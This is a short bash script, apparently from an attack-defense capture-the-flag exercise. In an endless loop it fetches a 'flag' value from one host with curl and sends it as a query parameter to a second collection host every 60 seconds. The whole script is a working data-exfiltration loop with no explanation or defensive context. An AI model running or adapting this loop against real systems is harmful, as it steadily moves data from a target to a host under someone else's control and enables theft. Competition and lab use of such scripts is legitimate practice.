#!/bin/bash
#reverse flag
while true
do
    flag=$(curl -s http://10.0.0.2)
    curl -s http://172.16.5.17:6061/?f=$flag
    sleep 60
done